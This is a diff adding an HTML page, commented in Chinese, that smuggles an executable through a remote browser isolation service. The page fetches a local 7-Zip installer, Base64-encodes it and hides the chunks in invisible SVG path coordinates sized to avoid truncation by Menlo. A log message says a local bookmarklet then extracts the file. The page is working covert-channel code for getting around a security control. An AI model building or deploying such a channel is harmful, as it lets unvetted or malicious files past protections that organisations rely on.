@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <title>RBI 記憶體檔案還原測試頁面</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        button { padding: 10px 15px; font-size: 16px; cursor: pointer; }
+        .status { margin-top: 15px; font-weight: bold; color: green; }
+    </style>
+</head>
+<body>
+  <h2>SVG Covert Channel (修正版)</h2>
+  <button onclick="injectSVG()">1. 編碼並注入 SVG</button>
+  <svg id="stego-svg" width="1" height="1" style="position:absolute; top:-9999px;"></svg>
+  <div id="log"></div>
+
+  <script>
+    const log = (msg) => document.getElementById('log').innerHTML += msg + '<br>';
+    // 每個 path 承載的 Base64 字元數量 
+    // 建議 2000-4000，避免單一 DOM 屬性過長被 Menlo 截斷
+    const CHUNK_SIZE = 3000; 
+
+    async function injectSVG() {
+      log('正在讀取檔案...');
+      
+      try {
+        const resp = await fetch('./7z2602-x64.exe');
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        const buffer = await resp.arrayBuffer();
+        const mockData = new Uint8Array(buffer);
+        log(`✅ 檔案讀取成功: ${mockData.length} bytes`);
+        
+        // 🛠️ 修正點：使用 FileReader 避免 Call Stack 溢位
+        log('正在轉換為 Base64 (這可能需要幾秒鐘)...');
+        const blob = new Blob([mockData], { type: 'application/octet-stream' });
+        const b64Data = await new Promise((resolve, reject) => {
+          const reader = new FileReader();
+          reader.onload = () => {
+            // reader.result 格式為 "data:application/octet-stream;base64,xxxxx..."
+            // 我們只需要逗號後面的純 Base64 字串
+            resolve(reader.result.split(',')[1]);
+          };
+          reader.onerror = () => reject(new Error('FileReader 讀取失敗'));
+          reader.readAsDataURL(blob);
+        });
+        
+        log(`✅ Base64 轉換完成，總長度: ${b64Data.length}`);
+        
+        const svg = document.getElementById('stego-svg');
+        const totalChunks = Math.ceil(b64Data.length / CHUNK_SIZE);
+        log(`開始分割為 ${totalChunks} 個 SVG Path...`);
+
+        // 為了不阻塞主執行緒，使用 requestAnimationFrame 或 setTimeout 分批渲染
+        for (let i = 0; i < totalChunks; i++) {
+          const chunk = b64Data.substring(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
+          
+          let pathD = "M ";
+          for (let j = 0; j < chunk.length; j += 2) {
+            const x = chunk.charCodeAt(j);
+            const y = j + 1 < chunk.length ? chunk.charCodeAt(j + 1) : 0;
+            pathD += `${x} ${y} L `;
+          }
+          pathD = pathD.slice(0, -2); 
+
+          const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
+          path.setAttribute("d", pathD);
+          path.setAttribute("data-idx", i);
+          path.setAttribute("stroke", "none");
+          path.setAttribute("fill", "none");
+          svg.appendChild(path);
+          
+          // 每處理 50 個 chunk 讓出主執行緒，防止瀏覽器 UI 凍結
+          if (i % 50 === 0) {
+            await new Promise(r => setTimeout(r, 0));
+          }
+        }
+        
+        log(`✅ SVG 隱寫注入完成！共生成 ${totalChunks} 個 Path 節點。`);
+        log('請在本地 Chrome 執行對應的 Bookmarklet 進行提取。');
+        
+      } catch (err) {
+        log(`❌ 發生錯誤: ${err.message}`);
+        console.error(err);
+      }
+    }
+  </script>
+</body>
+</html>
